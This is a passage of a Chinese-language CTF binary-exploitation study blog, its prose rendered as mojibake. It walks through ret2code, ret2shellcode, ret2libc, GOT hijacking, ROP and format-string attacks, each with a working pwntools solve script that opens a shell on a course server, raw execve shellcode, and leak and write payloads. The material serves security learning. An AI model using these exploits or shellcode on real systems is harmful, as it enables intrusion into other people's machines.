class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(payloads)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
åœ–ï¼š<br><img src="https://hackmd.io/_uploads/rJvGXcBa3.png"></li>
</ul>
<h2 id="BOF-Ret2code"><a href="#BOF-Ret2code" class="headerlink" title="BOF Ret2code"></a>BOF Ret2code</h2><h3 id="åˆ©ç”¨æ¢ä»¶-1"><a href="#åˆ©ç”¨æ¢ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¢ä»¶"></a>åˆ©ç”¨æ¢ä»¶</h3><ul>
<li>PIEè¢«é—œé–‰</li>
<li>æ²’æœ‰Stack Canary</li>
<li>æ¡ç”¨getè®€å–charé™£åˆ—ï¼Œå°è‡´Overflowæˆç«‹</li>
</ul>
<h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>Overflowåˆ°ä¸€å€‹å‡½æ•¸returnçš„åœ°æ–¹ï¼Œä¸¦ä¸”æ³¨å…¥æŸå€‹ç¨‹å¼ç¢¼ç‰‡æ®µä¸­çš„ä½å€ï¼Œæ¯”å–®ç´”BOFå¤šä¸€å€‹PIEè¢«é—œé–‰æ˜¯å› ç‚ºPIEæœƒå°‡dataæ®µå’Œcodeæ®µä½å€éš¨æ©ŸåŒ–  </p>
<h3 id="ç¯„ä¾‹-2"><a href="#ç¯„ä¾‹-2" class="headerlink" title="ç¯„ä¾‹"></a>ç¯„ä¾‹</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼šæœƒè¦ä½ è¼¸å…¥ä¸€å€‹å­—ä¸²ä¸¦è®€å–</li>
<li>è§£æ³•ï¼šghidraé€†å›å»ç™¼ç¾æœ‰å€‹éš±è—çš„å‡½æ•¸æ˜¯é€²åˆ°<code>/bin/sh</code>çš„adminåŠŸèƒ½ï¼Œè¦overflowåˆ°retçš„åœ°æ–¹ä½¿codeè·‘å»éš±è—çš„å‡½æ•¸ä½å€(å¯ä»¥ç”¨radare2æ•²å‡ºä¾†)ï¼Œæœ€å¾Œpayloadåœ¨è¨­è¨ˆçš„æ™‚å€™åªè¦è¨˜å¾—é™¤äº†æŠŠæ‰€æœ‰è³‡æ–™éƒ½overflowæ‰é‚„è¦åŠ ä¸Šsaved rbpçš„8 byteå¤§å°ä¸¦æ¥ä¸Šéš±è—å‡½æ•¸çš„ä½å€</li>
<li>solve script:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>,<span class="number">2121</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x400646</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
åœ–ï¼š<br><img src="https://hackmd.io/_uploads/SydoBqr6n.png"></li>
</ul>
<h2 id="BOF-Ret2ShellCode"><a href="#BOF-Ret2ShellCode" class="headerlink" title="BOF Ret2ShellCode"></a>BOF Ret2ShellCode</h2><h3 id="åˆ©ç”¨æ¢ä»¶-2"><a href="#åˆ©ç”¨æ¢ä»¶-2" class="headerlink" title="åˆ©ç”¨æ¢ä»¶"></a>åˆ©ç”¨æ¢ä»¶</h3><ul>
<li>NXè¢«é—œé–‰</li>
<li>PIEè¢«é—œé–‰</li>
<li>æ²’æœ‰Stack Canary</li>
<li>æ¡ç”¨getè®€å–charé™£åˆ—ï¼Œå°è‡´Overflowæˆç«‹</li>
</ul>
<h3 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>Overflowåˆ°ä¸€å€‹å‡½æ•¸returnçš„åœ°æ–¹ï¼Œä¸¦ä¸”æ³¨å…¥æŸå€‹ç¨‹å¼ç¢¼ç‰‡æ®µä¸­çš„ä½å€(æ­¤ä½ç½®å·²è¢«æ³¨å…¥&#x2F;bin&#x2F;shæ“ä½œpayload)ï¼Œæ¯”ret2codeé‚„åš´æ ¼æ˜¯å› ç‚ºNXæœƒå€åˆ†å¯åŸ·è¡Œå¯å¯«çš„æ¬Šé™ä¸é‡ç–Šï¼Œè€Œå¯ä»¥æ³¨å…¥shellcode payloadçš„åœ°æ–¹å¿…é ˆè¦åŒæ™‚èƒ½åŸ·è¡Œã€‚<br><code>geb-vmmapn å¯ä»¥ç¢ºå®šå“ªäº›è¨˜æ†¶é«”å€æ®µæ˜¯å¯ä»¥åŸ·è¡Œçš„</code></p>
<h3 id="ç¯„ä¾‹-3"><a href="#ç¯„ä¾‹-3" class="headerlink" title="ç¯„ä¾‹"></a>ç¯„ä¾‹</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼šæœƒè¦ä½ è¼¸å…¥ä½ çš„åå­—ä»¥åŠå¦ä¸€å€‹å­—ä¸²çš„ç°¡å–®cç¨‹å¼</li>
<li>è§£æ³•ï¼šç¬¬ä¸€æ¬¡è¼¸å…¥å¾ <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>ä¸Šæ‰¾åˆ°çš„linux_x86-64 shellcodeå­—ä¸²payload</li>
<li>solve script<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2122</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ret2sc&#x27;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
åœ–ï¼š<br><img src="https://hackmd.io/_uploads/SkiPO5STh.png"></li>
</ul>
<h2 id="BOF-Ret2Lib"><a href="#BOF-Ret2Lib" class="headerlink" title="BOF Ret2Lib"></a>BOF Ret2Lib</h2><h3 id="åˆ©ç”¨æ¢ä»¶-3"><a href="#åˆ©ç”¨æ¢ä»¶-3" class="headerlink" title="åˆ©ç”¨æ¢ä»¶"></a>åˆ©ç”¨æ¢ä»¶</h3><ul>
<li>å¿…é ˆæœ‰è¾¦æ³•æ‰¾åˆ°å°æ–¹çš„libä»¥åŠæŸå€‹å‡½æ•¸åœ¨libçš„ä½å€</li>
<li>NXè¢«é—œé–‰</li>
<li>PIEè¢«é—œé–‰</li>
<li>æ²’æœ‰Stack Canary</li>
<li>æ¡ç”¨getè®€å–charé™£åˆ—ï¼Œå°è‡´Overflowæˆç«‹</li>
</ul>
<h3 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h3><h4 id="Lazy-Binding-æ©Ÿåˆ¶"><a href="#Lazy-Binding-æ©Ÿåˆ¶" class="headerlink" title="Lazy Binding æ©Ÿåˆ¶"></a>Lazy Binding æ©Ÿåˆ¶</h4><p>åœ¨ç¨‹å¼ç¢¼éœ€è¦åŸ·è¡ŒæŸå€‹å‡½æ•¸æ™‚ï¼Œé€éå‘¼å«ä»–çš„pltå»gotè¡¨ä¸­å°‹æ‰¾ä»–åœ¨libaryä¸­çš„çœŸæ­£ä½ç½®ï¼Œå¦‚æœæ²’æœ‰çš„è©±å°±æœƒå»libraryæŠŠè©²å‡½æ•¸æŠ“å‡ºä¾†ä¸¦æ”¾å…¥gotè¡¨ä»¥ä¾¿ä¸‹æ¬¡æŸ¥è©¢  </p>
<h4 id="Libc-Base"><a href="#Libc-Base" class="headerlink" title="Libc Base"></a>Libc Base</h4><p>åˆ©ç”¨libcé€²è¡Œèˆ‰ä¾‹ï¼š<br>å› ç‚ºASLRçš„ç³»çµ±è¨­å®šï¼Œæ¯æ¬¡got valueéƒ½æœƒåŠ ä¸Šä¸€å€‹éš¨æ©Ÿçš„libc baseï¼Œå°è‡´æ¯æ¬¡åŸ·è¡Œçš„æ™‚å€™got valueéƒ½ä¸ä¸€æ¨£ã€‚<br>å¦‚æœå¯ä»¥å¾—åˆ°æŸå‡½æ•¸çš„gotä½å€ï¼Œå°±å¯ä»¥ç®—å‡ºlibcä¸¦åŠ ä¸Šä»»æ„å‡½æ•¸çš„åœ¨libcçš„ä½å€<br>libc base&#x3D;å‡½æ•¸çš„got value-å‡½æ•¸åœ¨libcä¸­çš„ä½å€  </p>
<h4 id="æ‰‹æ³•"><a href="#æ‰‹æ³•" class="headerlink" title="æ‰‹æ³•"></a>æ‰‹æ³•</h4><p>Overflowåˆ°ä¸€å€‹å‡½æ•¸returnçš„åœ°æ–¹ï¼Œä¸¦ä¸”æ³¨å…¥æŸå€‹ä½å€ï¼Œæœ€å¾Œè®“ä»–return å»libcä¸Šé¢çš„æŸäº›å¥½ç”¨å‡½æ•¸(åƒæ˜¯systemï¼Œexecve)ã€‚<br>å¿…é ˆå¾—åˆ°æŸå€‹å‡½æ•¸çš„got valueä»¥åŠå°æ–¹çš„libcï¼Œæ‰èƒ½åæ¨å›å»ä½ è¦çš„ç‰¹å®šå‡½æ•¸got valueä¸¦æ³¨å…¥  </p>
<h3 id="ç¯„ä¾‹-4"><a href="#ç¯„ä¾‹-4" class="headerlink" title="ç¯„ä¾‹"></a>ç¯„ä¾‹</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼š(æœ‰æä¾›åŸ·è¡Œç’°å¢ƒlibc)æœƒè¦ä½ çµ¦å®šä¸€å€‹hexå€¼ä¸¦æŸ¥è©¢ä»–çš„got valueï¼Œä¸¦è®“ä½ å†æ¬¡è¼¸å…¥ä¸€å€‹å­—ä¸²</li>
<li>è§£æ³•ï¼šåˆ©ç”¨radare2é€†å‡ºputså‡½æ•¸çš„gotè¡¨ä½å€ï¼Œè¼¸å…¥è©²ä½å€å¾Œå–å¾—putsçš„got valueï¼Œé€²è€Œæ¨å‡ºlibc baseã€‚</li>
<li>åˆ©ç”¨one_gadgetåŠ ä¸Šæä¾›çš„libcæª”æ¡ˆå–å¾—<code>execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</code>å‡½æ•¸åœ¨libcçš„ä½å€ï¼Œæœ€å¾Œç¶“ç”±got valueç®—æ³•åŠ å›å»ä¸¦åˆ©ç”¨ BOF retæ³¨å…¥å³å¯<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2123</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">&#x27;0x601018&#x27;</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">dat=<span class="built_in">int</span>(s[<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">dat=dat</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(dat))</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>+p64(dat-<span class="number">0x000000000006f690</span>+<span class="number">0x45216</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
åœ–ï¼š<br><img src="https://hackmd.io/_uploads/B1NSjcHan.png"></li>
</ul>
<h2 id="GOT-Hijacking"><a href="#GOT-Hijacking" class="headerlink" title="GOT Hijacking"></a>GOT Hijacking</h2><h3 id="åˆ©ç”¨æ¢ä»¶-4"><a href="#åˆ©ç”¨æ¢ä»¶-4" class="headerlink" title="åˆ©ç”¨æ¢ä»¶"></a>åˆ©ç”¨æ¢ä»¶</h3><ul>
<li>No PIE</li>
<li>Partial&#x2F;No RELRO</li>
</ul>
<h3 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åˆ©ç”¨å¯ä»¥å‰µé€ å¯ä»¥ä¿®æ”¹pltå€¼çš„æ©Ÿæœƒæ”¹æˆæƒ³è¦çš„å‡½æ•¸ä¹‹ä½å€  </p>
<h2 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h2><p>ç°¡ç¨±ï¼šROP<br>æˆ³ä¸€ä¸‹-&gt;||ROPå¥½å¥½ç©owob||  </p>
<h3 id="åˆ©ç”¨æ¢ä»¶-5"><a href="#åˆ©ç”¨æ¢ä»¶-5" class="headerlink" title="åˆ©ç”¨æ¢ä»¶"></a>åˆ©ç”¨æ¢ä»¶</h3><ul>
<li>è¦æœ‰è‰¯å¥½çš„ret gadget</li>
<li>PIEè¢«é—œé–‰</li>
<li>æ²’æœ‰Stack Canary</li>
<li>æ¡ç”¨getè®€å–charé™£åˆ—ï¼Œå°è‡´Overflowæˆç«‹</li>
</ul>
<h3 id="åŸç†-5"><a href="#åŸç†-5" class="headerlink" title="åŸç†"></a>åŸç†</h3><h4 id="ROP-Gadget"><a href="#ROP-Gadget" class="headerlink" title="ROP Gadget"></a>ROP Gadget</h4><p>æ‰€è¬‚ROP Gadgetå°±æ˜¯æœ€å¾Œç”±retçµå°¾çš„ç¨‹å¼ç¢¼ç‰‡æ®µ<br>å¯ä»¥ä½¿ç”¨å·¥å…·ROPgadgeté¸æ“‡é©åˆçš„ç‰‡æ®µ  </p>
<h4 id="æ‰‹æ³•-1"><a href="#æ‰‹æ³•-1" class="headerlink" title="æ‰‹æ³•"></a>æ‰‹æ³•</h4><p>åˆ©ç”¨BOFä¸²æ¥Gadgetåˆ°stackä¸Šé¢ä¸¦è®“å®ƒåŸ·è¡Œåœ¨å‡½æ•¸returnçš„åœ°æ–¹ï¼Œé€²è¡Œpopã€retç­‰å„ç¨®æ“ä½œå¾Œæ­é…çµ¦å®šçš„ret2codeè®Šæ•¸(å¿…é ˆæ˜¯å…¨åŸŸæˆ–è€…æœ‰è¾¦æ³•æ‰¾åˆ°ä»–çš„ä½å€ï¼Œä¸ç„¶ç„¡æ³•å†åˆ¥çš„å‡½æ•¸è£¡æˆ³å®ƒ)ï¼Œæœ€å¾Œè·‘åˆ°æŸå€‹ç‰‡æ®µåšåŸ·è¡Œ(é€šå¸¸æ˜¯systemå‡½æ•¸)  </p>
<h3 id="ç¯„ä¾‹-5"><a href="#ç¯„ä¾‹-5" class="headerlink" title="ç¯„ä¾‹"></a>ç¯„ä¾‹</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼šæœƒæœ‰å…©æ¬¡è¼¸å…¥å­—ä¸²çš„æ©Ÿæœƒï¼Œç¬¬ä¸€æ¬¡æå•æ™‚æœƒç”¨systemä¸­çš„echoè¼¸å‡ºï¼Œä¸¦ä¸”è¼¸å…¥çš„æ˜¯å€‹å…¨åŸŸè®Šæ•¸çš„å­—ä¸²ï¼Œç¬¬äºŒå€‹å‰‡æ˜¯geté€²å»ä¸€å€‹Buffer  </li>
<li>è§£æ³•ï¼š  </li>
<li>0.çœ‹åˆ°systemå…ˆradare2æ‰¾å‡ºæ˜¯è·‘å»å“ªè£¡call systemçš„<br><img src="https://hackmd.io/_uploads/rkKy8orp3.png">  </li>
<li>1.åˆ©ç”¨ROPgadgetæŠ“retçµå°¾çš„æ±æ±<br><img src="https://hackmd.io/_uploads/SybrPsSTn.png">  </li>
<li>2.æ‰¾å‡ºå…¨åŸŸè®Šæ•¸çš„ä½å€<br><img src="https://hackmd.io/_uploads/Hk2KDoSah.png"><br>äº‹å‰æº–å‚™çµæŸ~~  </li>
<li>3.ç¬¬ä¸€æ¬¡è¼¸å…¥çš„æ™‚å€™payloadç‚ºâ€&#x2F;bin&#x2F;sh\x00â€(çµå°¾\x00æ˜¯ç‚ºäº†åšè®€å–åˆ°çµå°¾çš„æç¤º)  </li>
<li>4.æœ€å¾ŒæŠŠå‰›å‰›çš„æ‰¾åˆ°çš„ret gadget - å…¨åŸŸè®Šæ•¸ä½å€ - call systemçš„è·¯å¾‘ä¾åºä¸²èµ·ä¾†ï¼Œå®ƒå°±æœƒç”¨systemåŸ·è¡Œå‰›å‰›è®Šæˆpayloadçš„å…¨åŸŸè®Šæ•¸å•¦å•¦å•¦~~~~  </li>
<li>solve script<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2120</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#global_variable defining</span></span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x0000000000400773</span>)+p64(<span class="number">0x601070</span>)+p64(<span class="number">0x4006bf</span>)</span><br><span class="line"><span class="comment">#buffer(0x30)+rdi(0x8)+ret2gadget(0x8)+gadgetValue(0x8)+gadget_to_system_function(0x8)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
åœ–ï¼š<br><img src="https://hackmd.io/_uploads/HyaIuir6n.png"><br>wwwwå…¶å¯¦ROPæ„Ÿè¦ºé‚„æœ‰å¾ˆå¤šæ±è¥¿é‚„æ²’å­¸åˆ°ï¼Œä¹‹å¾Œæœ‰ç©ºç·´owob</li>
</ul>
<h2 id="Format-String-Attack"><a href="#Format-String-Attack" class="headerlink" title="Format String Attack"></a>Format String Attack</h2><h3 id="åˆ©ç”¨æ¢ä»¶-6"><a href="#åˆ©ç”¨æ¢ä»¶-6" class="headerlink" title="åˆ©ç”¨æ¢ä»¶"></a>åˆ©ç”¨æ¢ä»¶</h3><ul>
<li>c è£¡é¢çš„printfå‡½æ•¸è¢«ä½¿ç”¨</li>
</ul>
<h3 id="åŸç†-6"><a href="#åŸç†-6" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å¤§æ¦‚å¿µï¼šcèªè¨€è£¡é¢çš„printfå¦‚æœå–®ç´”è¼¸å‡ºå­—ä¸²è®Šæ•¸å…¶å¯¦æ˜¯å¯ä»¥è¢«è‡ªè¨‚æ ¼å¼çš„<br><code>%x</code>ä»¥hexçš„æ–¹å¼è¼¸å‡ºå…§å®¹ï¼Œä¸€ç›´ç–Šå¯ä»¥æˆ³è¶…å‡ºè¨˜æ†¶é«”<br><code>%p</code>æœƒè¼¸å‡ºæŸå€‹è®Šæ•¸çš„value<br><code>%&#123;number&#125;$p</code>å¯ä»¥è¼¸å‡ºstackä¸Šé¢æŒ‡å®šnumberçš„è®Šæ•¸value<br><code>%&#123;amount&#125;c%&#123;number&#125;$n</code>å¯ä»¥å¡«å…¥æŸå€‹amountçš„å­—å…ƒåˆ°stackä¸Šé¢æŸå€‹è®Šæ•¸ï¼Œä¸¦ä¸”å› ç‚ºå¾Œé¢æ¥næ‰€ä»¥å¯ä»¥è®Šæˆ8byteçš„valueï¼Œä½†æ˜¯é€™æ¨£é«˜æ©Ÿç‡æœƒå‡ºäº‹æƒ…ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½ä½¿ç”¨1byteçš„hhnå¡«ä¸‹å»  </p>
<h3 id="ç¯„ä¾‹1"><a href="#ç¯„ä¾‹1" class="headerlink" title="ç¯„ä¾‹1"></a>ç¯„ä¾‹1</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼šå«ä½ è¼¸å…¥æ±è¥¿ç„¶å¾Œä»–æœƒè¼¸å‡ºé†¬</li>
<li>è§£æ³•ï¼šé˜¿å°±ç”¨ %{number}$p çš„æ–¹æ³•ä¸€ç›´äº‚æˆ³ä¸‹å»å°±å¥½ï¼Œæœ€å¾Œç™¼ç¾æ¯å€‹è³‡æ–™éƒ½è¢«å€’éä¾†äº†å°±å€’å›å»(å–”å–”é‚„æœ‰æœƒè¢«hexç·¨ç¢¼é)</li>
<li>solve script<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">4001</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s);</span><br><span class="line">payload=<span class="string">&#x27;%6$p,%7$p,%8$p,%9$p,%10$p,%11$p,%12$p#&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;#&#x27;</span>)[<span class="number">9</span>:-<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">x</span>):</span><br><span class="line">    x=<span class="built_in">hex</span>(<span class="built_in">int</span>(x[<span class="number">2</span>:], <span class="number">16</span>))</span><br><span class="line">    x=binascii.unhexlify(x[<span class="number">2</span>:])</span><br><span class="line">    cnt=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        cnt += x[<span class="built_in">len</span>(x)-<span class="number">1</span>-i]</span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line">ans=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ans+=enc(i)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
åœ–ï¼š(ä¸å°å¿ƒæˆ³å¤ªå¤šæ±è¥¿å‘µå‘µ)<br><img src="https://hackmd.io/_uploads/By-PijSa2.png"></li>
</ul>
<h3 id="ç¯„ä¾‹2"><a href="#ç¯„ä¾‹2" class="headerlink" title="ç¯„ä¾‹2"></a>ç¯„ä¾‹2</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼šå«ä½ è¼¸å…¥æ±è¥¿ï¼Œç”¨printfè¼¸å‡ºï¼Œç„¶å¾Œæ¯”å°æŸå…©å€‹int valueå¦‚æœå»åˆåˆ°å°±å¯ä»¥æ‹¿åˆ°&#x2F;bin&#x2F;sh  </li>
<li>è§£æ³•ï¼šåˆ©ç”¨radare2ç¢ºèªstackä¸Šé¢å¯ä»¥å¡å“ªæ±è¥¿ï¼Œæ…¢æ…¢ç®—ä»¥å¾Œå†ç”¨â€™aâ€™å»å¡«å……ï¼Œæœ€å¾Œå†æ¥ä¸Šä½ çš„stackä¸Šé¢ä½ å‰›å‰›è¦å¡«å…¥åˆ°ç¬¬å¹¾å€‹çš„ä½ç½®å¡å…¥ä½ è¦æ”¹è®Šçš„è¨˜æ†¶é«”ä½å€(å¥½é¥’å£ï¼Œä¹‹å¾Œä¿®)</li>
<li>é‡é»ï¼šè¦å¾ä½ä½å¾€é«˜ä½å¡«å¯«ï¼Œå‡è¨­æ¬²å¡«å¯«çš„å€¼ç‚º<code>v1</code>ï¼Œå‰ä¸€ä½æ¬²å¡«å¯«å€¼ç‚º<code>v0</code>ï¼Œé‚£é ˆåœ¨é€™ä¸€ä½å¡«å¯«<code>256-v0+v1</code>  </li>
<li>è¨»ï¼šåˆ©ç”¨<code>%&#123;amount&#125;c%&#123;number&#125;$hhn</code>é¡å‹çš„payloadæ‰“</li>
<li>solve script<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">4003</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">%??c%?$hhn%??c%?$hhn%??c%?$hhn%??c%?$hhn</span></span><br><span class="line"><span class="string">value</span></span><br><span class="line"><span class="string">value+1</span></span><br><span class="line"><span class="string">value+2</span></span><br><span class="line"><span class="string">value+3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ch=<span class="number">0</span></span><br><span class="line">addr=<span class="number">0x404050</span></span><br><span class="line">value=<span class="number">0xfaceb00c</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">idx=<span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    addch=((<span class="number">256</span>-ch)+(value&amp;<span class="number">0xff</span>))%<span class="number">256</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(addch, idx)</span><br><span class="line">    ch=value &amp; <span class="number">0xff</span></span><br><span class="line">    value &gt;&gt;= <span class="number">8</span></span><br><span class="line">    idx=idx+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(payload, <span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload+<span class="number">3</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload, <span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload+p64(addr)+p64(addr+<span class="number">1</span>)+p64(addr+<span class="number">2</span>)+p64(addr+<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(payload, <span class="built_in">len</span>(payload))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
åœ–ï¼š<br><img src="https://hackmd.io/_uploads/S1sh2sH6n.png"></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
